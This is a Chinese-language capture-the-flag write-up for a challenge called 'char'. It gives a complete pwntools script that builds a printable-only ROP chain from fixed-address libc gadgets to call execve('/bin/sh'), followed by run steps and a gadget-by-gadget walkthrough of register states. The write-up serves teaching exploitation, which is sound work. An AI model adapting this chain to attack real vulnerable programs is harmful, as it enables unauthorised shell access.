# 解析char-130

> 参考了[https://gist.github.com/rick2600/ae2af7ffd33a17836f06ce191f643b26](https://gist.github.com/rick2600/ae2af7ffd33a17836f06ce191f643b26)

> 主要解法

```python
from pwn import *

rop = "A" * 32          # <1>

# set ecx = 0
rop += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret <2>
rop += p32(0x41414141)
rop += p32(0x41414141)
rop += p32(0x556d2a51) # pop ecx ; add al, 0xa ; ret <3>
rop += p32(0x41414141)
rop += p32(0x55655b4c) # sub ecx, edx ; add esp, 0x4c ; mov eax, ecx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  <4>
rop += "A" * 0x4c
rop += p32(0x41414141) * 4

# set eax = 0x5563704d (ret)
rop += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret  <5>
rop += p32(0x5563704d) # edx
rop += p32(0x41414141) # edi
rop += p32(0x555b3454) # mov eax, edx ; ret  <6>

# ebx = '...///////bin/sh'
rop += p32(0x55643026) # push eax ; push esp ; xor eax, eax ; pop ebx ; ret  <7>
rop += p32(0x556a3457) # xor eax, eax ; ret <8>
rop += p32(0x556c6864) # inc eax ; ret 0 <9>
rop += p32(0x556d2860) * 2 # add ah, al ; ret  <10>
rop += p32(0x55634e43) # add bh, ah ; ret <11>

# set edx = 0
rop += p32(0x55617940) # mov edx, 0xffffffff ; cmovne eax, edx ; ret <12>
rop += p32(0x555e7a4b) # inc edx ; add al, 0x5f ; ret  <13>

# esi = execve+0x23 0x55616603
rop += p32(0x55623c37) # pop esi ; ret  <14>
rop += p32(0x55616621) 
rop += p32(0x556f4237) * (0x21-0x3) # dec esi ; ret <15>
rop += p32(0x556e552c) # push esi; ret <16>

rop += "/" * 500 + "/bin/sh"
print('%s'%(rop))
```

## 破解方法
> 运行 python solve.py 输出的字符串。
> 再运行 LD_PRELOAD=/home/char/libc.so ./char （这里一定要把libc.so放到/home/char目录下面，这个是必须的）等到出现 GO )提示之后，把输出的字符串COPY，就可以了。

> 这里的难度在于几点：
*  反汇编了，看到有一个函数检查输入值。这里的输入值必须在 '!' 到'}' 之间，不能超过这些值，（这里面，因为空格是不能被scanf接受）
* 这里的栈上是不能执行代码的，所以，最后要想办法得到数据

> 但其实也有可以进行处理的内容的方便，
* 这里在开始把libc.so这个方便映射到了 0x5555e000 这样的地址，而且还把这个所有的地址变成了 PROT_EXEC|PROT_WRITE 的属性
* 这里可以有最多2400个字符。
* 这里的地址是固定的。可以用硬代码

## 解释代码
* <1> 这里的前面 32个'A' 是在strcpy 之后，会有一些对esp的调整，特别是ebp原来保存的内容，把栈调整，这里是给第一个返回值 0x555f3555 
* <2> 这个返回值，如果你用gdb来进行跟踪，就是进入了 pop edx ; xor eax, eax ; pop edi ; ret 汇编代码，这里如何来的，你想一下，前面mmap 了libc.so 到了0x5555e000，再用objdump -D libc.so ，查看了0x95554这里的代码，当然，实际处理是把前面一个0x75没有，就是运行上面的代码了。 这个之后的edx=0x41414141 edi=0x41414141 eax=0x0
* <3> 这个时候得到的 0x174a51 = 0x556d2a51 - 0x555e0000 的地址是 pop ecx;add al,10; ret ;ecx=0x41414141 eax=0xa
* <4> 这个时候得到 0xf7b4c = 0x55655b4c - 0x555e0000的地址是 sub ecx, edx ; add esp, 0x4c ; mov eax, ecx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret ;运行 ecx=0x0 , eax=0x0,ebx=0x41414141, esi=0x41414141, edi=0x41414141,ebp=0x41414141 这里前面填充0x4c*'A'就是处理 add esp,0x4c
* <5> 这个时候得到的 0x95555 = 0x555f3555 - 0x555e0000 的地址是 pop edx ; xor eax, eax ; pop edi ; ret 就是运行上面的代码了。 这个之后的edx=0x5563704d edi=0x41414141 eax=0x0
* <6> 这个时候得到的 0x55454 = 0x555b3454 - 0x555e0000 的地址是 mov eax, edx ; ret 就是运行上面的代码了。 这个之后的 eax=0x5563704d
* <7> 这个时候得到的 0xe5026 = 0x55643026 - 0x555e0000 的地址是 push eax ; push esp ; xor eax, eax ; pop ebx ; ret 就是运行上面的代码了。 这个之后的 eip=0x5563704d, eax=0x0,ebx=esp（这里代码注释中说是指向///..//bin/sh，但实际上是指向这个之前，因为这里我们还没有运行完毕，所以，这里的后面进行修正）这个指向的0x5563704d这个值是可以允许的ret值，所有这些其实关键是指向ebx=...////bin/sh
* <8> 这个时候得到的 0x145457 = 0x556a3457 - 0x555e0000 的地址是 xor eax, eax ; ret 就是运行上面的代码了。 这个之后的 eax=0x0
* <9> 这个时候得到的 0x168864 = 0x556c6864 - 0x555e0000 的地址是 inc eax ; ret 0 就是运行上面的代码了。 这个之后的 eax=1
* <10> 这里两次运行了代码 0x174860 = 0x556d2860 - 0x555e0000 的地址是 add ah, al ; ret 这个运行完毕 eax=0x201
* <11> 这里两次运行了代码 0xd6e43 = 0x55634e43 - 0x555e0000 的地址是 add bh, ah ; ret 这个运行完毕 ebx向高端移动了0x200的地址，刚才我们说了，这个值原来是指向地址的，这里是真的指向了...///bin/sh了，
* <12> 这个目的是把edx=0，因为后面要用到的
* <14> <15> 是调整esi的值，指向execve这里最后的调用代码mov eax,0bh;call gs:0x10 这里主要是原因是要调整指针，因为要满足前面的字符串条件，所以，要对这里进行调整，最后调用 execve("///bin/sh",NULL,NULL)这个调用成功 ebx="///bin/sh" ,ecx=NULL edx=NULL

